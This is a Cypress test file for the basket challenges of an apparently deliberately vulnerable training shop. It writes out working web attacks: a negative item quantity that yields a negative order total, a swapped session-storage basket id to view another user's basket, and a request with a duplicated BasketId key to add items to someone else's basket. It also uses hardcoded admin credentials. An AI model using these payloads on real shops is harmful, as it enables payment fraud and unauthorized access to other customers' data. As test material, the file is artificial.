describe('/#/basket', () => {
  describe('as admin', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    describe('challenge "negativeOrderChallenge"', () => {
      it('should be possible to update a basket to a negative quantity via the Rest API', () => {
        cy.window().then(async () => {
          const response = await fetch(
            `${Cypress.config('baseUrl')}/api/BasketItems/1`,
            {
              method: 'PUT',
              cache: 'no-cache',
              headers: {
                'Content-type': 'application/json',
                Authorization: `Bearer ${localStorage.getItem('token')}`
              },
              body: JSON.stringify({ quantity: -100000 })
            }
          )
          if (response.status === 200) {
            console.log('Success')
          }
        })
        cy.visit('/#/order-summary')

        cy.get('mat-cell.mat-column-quantity > span')
          .first()
          .then(($ele) => {
            const quantity = $ele.text()
            expect(quantity).to.match(/-100000/)
          })
      })

      it('should be possible to place an order with a negative total amount', () => {
        cy.visit('/#/order-summary')
        cy.get('#checkoutButton').click()
        cy.expectChallengeSolved({ challenge: 'Payback Time' })
      })
    })

    describe('challenge "basketAccessChallenge"', () => {
      it('should access basket with id from session storage instead of the one associated to logged-in user', () => {
        cy.window().then(() => {
          window.sessionStorage.bid = 3
        })

        cy.visit('/#/basket')

        // TODO Verify functionally that it's not the basket of the admin
        cy.expectChallengeSolved({ challenge: 'View Basket' })
      })
    })

    describe('challenge "basketManipulateChallenge"', () => {
      it('should manipulate basket of other user instead of the one associated to logged-in user', () => {
        cy.window().then(async () => {
          await fetch(`${Cypress.config('baseUrl')}/api/BasketItems/`, {
            method: 'POST',
            cache: 'no-cache',
            headers: {
              'Content-type': 'application/json',
              Authorization: `Bearer ${localStorage.getItem('token')}`
            },
            body: '{ "ProductId": 14,"BasketId":"1","quantity":1,"BasketId":"2" }'
          })
        })
        cy.expectChallengeSolved({ challenge: 'Manipulate Basket' })
      })
    })
  })
})
